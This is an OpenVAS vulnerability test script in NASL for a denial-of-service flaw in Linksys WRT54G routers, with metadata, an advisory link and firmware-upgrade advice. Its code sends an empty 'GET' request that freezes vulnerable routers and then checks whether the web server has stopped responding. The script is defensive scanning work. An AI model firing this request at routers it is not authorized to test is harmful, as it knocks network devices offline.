# OpenVAS Vulnerability Test
# Description: Linksys WRT54G DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11941");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Linksys WRT54G DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.zone-h.org/en/advisories/read/id=3523/");

  script_tag(name:"solution", value:"Upgrade your firmware.");

  script_tag(name:"summary", value:"It is possible to freeze the remote web server by
  sending an empty GET request.");

  script_tag(name:"affected", value:"This is know to affect Linksys WRT54G routers.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);
if(http_is_dead(port: port))
  exit(0);

soc = http_open_socket(port);
if(!port)
  exit(0);

req = 'GET\r\n';
send(socket:soc, data:req);
http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port, retry:4)) {
  security_message(port:port);
  exit(0);
}

exit(99);